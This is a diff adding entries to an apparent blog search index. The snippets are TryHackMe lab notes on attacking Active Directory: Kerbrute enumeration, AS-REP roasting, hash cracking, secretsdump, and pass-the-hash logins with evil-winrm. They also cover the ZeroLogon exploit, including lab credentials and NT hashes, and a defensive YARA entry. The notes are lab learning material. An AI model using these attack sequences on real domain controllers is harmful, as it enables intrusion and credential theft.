@@ -1,6 +1,51 @@
 [
   
   {
+    "title": "THM Attacktive Directory",
+    "url": "/posts/THM-Attacktive-Directory/",
+    "categories": "sec",
+    "tags": "ActiveDirectory",
+    "date": "2022-05-18 11:33:00 +0800",
+    
+
+
+
+
+
+    "snippet": "install Impacket  https://github.com/SecureAuthCorp/impacketgit clone https://github.com/SecureAuthCorp/impacket.git /opt/impacketpip3 install -r /opt/impacket/requirements.txtcd /opt/impacket/ &amp;&amp; python3 ./setup.py installInstalling Bloodhound and Neo4j  https://github.com/BloodHoundAD/BloodHound  https://github.com/neo4japt install bloodhound neo4jnmapnmap -sC -sV -oA nmap.out 10.10.222.186Kerbrute  based on ImpacketEnumerate users./kerbrute_linux_amd64 userenum  -d spookysec.local --dc 10.10.156.79  /home/kali/Desktop/userlist.txt  GetNPUsers.py  an Impacket tool  ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set.python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-adminfind hash type  https://hashcat.net/wiki/doku.php?id=example_hashesbruteforce hashhashcat -m 18200 ./svcHash /home/kali/Desktop/passwordlist.txt  --forcesmbclientlist sharessmbclient --user svc-admin -L 10.10.30.17connect to one share named “backup”smbclient //10.10.30.17/backup --user svc-adminbackup@spookysec.local:backup2517860secretsdump.pyunderstanding windows hash  https://hunter2.gitbook.io/darthsidious/getting-started/intro-to-windows-hashespython3 secretsdump.py  backup@10.10.30.17 -just-dcpass the hash attack  https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attackevil-winrm loginevil-winrm -i 10.10.30.17 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc"
+  },
+  
+  {
+    "title": "Zero Logon CVE",
+    "url": "/posts/Zero-Logon/",
+    "categories": "sec",
+    "tags": "cve",
+    "date": "2022-05-17 11:33:00 +0800",
+    
+
+
+
+
+
+    "snippet": "Zero LogonCVE-2020-1472  abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol)  AES-CFB8 with hard coded IV.  https://github.com/SecuraBV/CVE-2020-1472, the POC  https://github.com/Sq00ky/Zero-Logon-Exploit, change password to null after exploitstepimpacket installationpython3 -m pip install virtualenvpython3 -m virtualenv impacketEnvsource impacketEnv/bin/activatepip install git+https://github.com/SecureAuthCorp/impacketreconuse nmap -sC -sVexploitpython3 zerologon.py DC01 10.10.166.73dumppython3 secretdump.py -just-dc -no-pass DC01\\$@10.10.166.73NT hash is 3f3ef89114fb063e3d7fc23c20f65568Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::Domain Admin accounts  starts with a-, like a-fubukis, a-koronei.login by evil-winrmevil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.166.73"
+  },
+  
+  {
+    "title": "Yara",
+    "url": "/posts/yara/",
+    "categories": "sec",
+    "tags": "yara",
+    "date": "2022-05-16 11:33:00 +0800",
+    
+
+
+
+
+
+    "snippet": "installsudo apt update -y &amp;&amp; sudo apt upgrade -ysudo apt install yarausageyara myfirstrule.yar somefilewrite rules  https://yara.readthedocs.io/en/stable/writingrules.html  https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18ddawesome-yara  https://github.com/InQuest/awesome-yaraLoki  python loki.py -h  python loki.py -p . path of current directoryyarGen  https://github.com/Neo23x0/yarGen  creation of yara rules from strings found in malware files while removing all strings that also appear in goodware files.  yarGen includes a big goodware strings  python3 yarGen.py --update  python3 yarGen.py -m ./suspicious-files --excludegood -o /home/suspicious-file.yar  --excludegood force to exclude all goodware strings  copy rule to loki cp suspicious-file.yar ~/tools/Loki/signature-base/yara  yarAnalyzer, another tool to create yara rule, https://github.com/Neo23x0/yarAnalyzer/Valhalla  https://www.nextron-systems.com/valhalla/"
+  },
+  
+  {
     "title": "BurpSuite Lab",
     "url": "/posts/BurpSuite-Lab/",
     "categories": "sec",
